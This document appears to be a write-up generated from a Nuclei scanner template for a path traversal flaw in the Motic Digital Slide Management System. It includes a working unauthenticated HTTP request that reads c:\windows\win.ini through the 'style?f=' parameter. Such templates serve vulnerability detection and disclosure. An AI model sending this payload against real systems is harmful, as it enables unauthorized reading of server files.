# Nuclei Template: MoticDSM - Arbitrary File Read
**Template ID:** motic-dsm-arbitrary-file-read
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`motic-dsm-arbitrary-file-read.yaml`)

## Vulnerability Information & PoC

## Description
Motic Digital Slide Management System style has an arbitrary file reading vulnerability. Unauthenticated attackers can exploit this vulnerability to read important system files, leaving the website in a highly insecure state.

## Steps to reproduce / Exploit Payload
```http
GET /UploadService/Page/ HTTP/1.1
Host: {{Hostname}}

GET /UploadService/Page/style?f=c:\windows\win.ini HTTP/1.1
Host: {{Hostname}}
```

## References
- https://blog.csdn.net/qq_41904294/article/details/141219553
- https://blog.csdn.net/weixin_44337800/article/details/141328430
